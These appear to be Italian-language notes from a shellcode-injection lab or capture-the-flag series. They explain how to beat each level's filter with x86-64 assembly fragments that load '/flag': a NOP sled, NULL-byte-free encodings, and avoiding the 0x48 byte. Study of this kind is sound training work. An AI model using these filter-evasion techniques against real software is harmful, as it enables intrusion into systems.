# Shellcode Injection

## Spiegazione come risolvere i problemi che richiedono di creare delle shellcode da iniettare all'interno di un' programma

+ Livello 1 prende il codice e lo esegue direttamente. Funziona con **chmod_gpt e open_gpt**.  
Invece shell_gpt, sebbene funzioni attraverso sudo, non funziona con la challenge.

+ Livello 2 impone come restrizione di saltare fino a 2048 byte oltre l'inizio. Soluzione consiste nel inseire un nop sled, ovvero una sequenza di 2048 nop per evitare questo salto.  
Per farlo usiamo l'istruzione assembly .rept <quantità>, nello specifico:

    ```s
    start:
        .rept 2048
            nop
        .endr

        # codice continua qui
        mov rbx, 0x00000067616c662f
    ```

    Funziona con **chmod_gpt e open_gpt**, ma non con shell_gpt.

+ Livello 3 richiede di scrivere una shellcode senza avere NULL byte, ovvero byte 00 nel codice. I byte 00 li troviamo quando facciamo somme su registri a 64 bit con numeri non abbastanza grossi oppure quando carichiamo su un registro a 64 bit /flag lasciando 3 caratteri a 00.  
Per questi due casi ci sono due soluzioni: utilizzare xor per impostare il valore 0, inc per aumentare il valore di un registro di uno e usare registri più piccoli per le somme e i mov.

    ```s
    start:
        # Per ricreare mov rbx, 0x67616c662f usiamo i registri più piccoli e gli shift per creare lo spazio necessario senza lasciare spazi a 00
        xor rbx, rbx
        mov ebx, 0x67616c66; 
        shl rbx, 8; 
        mov bl, 0x2f         

        # Per ricreare mov rax, 2 impostiamo il valore di al invece che di rax poichè il valore è molto piccolo          
        xor rax, rax
        mov al, 2             

        # Per mettere mov rdi, 1 usiamo xor e poi incrementiamo
        xor rdi, rdi
        inc rdi              
    
        # Un altra possibilità è quella di usare rept per ripetere n volte un istruzione (mov r10, 1000)
        xor r10, r10
        .rept 1000
        inc r10                               
        .endr
    ```

+ Livello 4 richiede di non avere byte che in esadecimale formino il 48, ovvero la lettera H, che sono i byte delle istruzioni mov, xor e inc a 64 bit. La soluzione è usare registri a 32 bit oppure usare push e pop nei registri

    ```s
    start:
        # Per passare valori più lunghi, tipo mov rbx, 0x00000067616c662f, dobbiamo pushare una parte sullo stack e poi aggiungere l'altra parte manualmente attraverso la deferenziazione    
        push 0x616c662f
        mov dword ptr [rsp+4], 0x00000067   

        # Per passare un valore numerico, tipo mov r10, 1000 usiamo push e pop
        push 1000
        pop r10
    ```
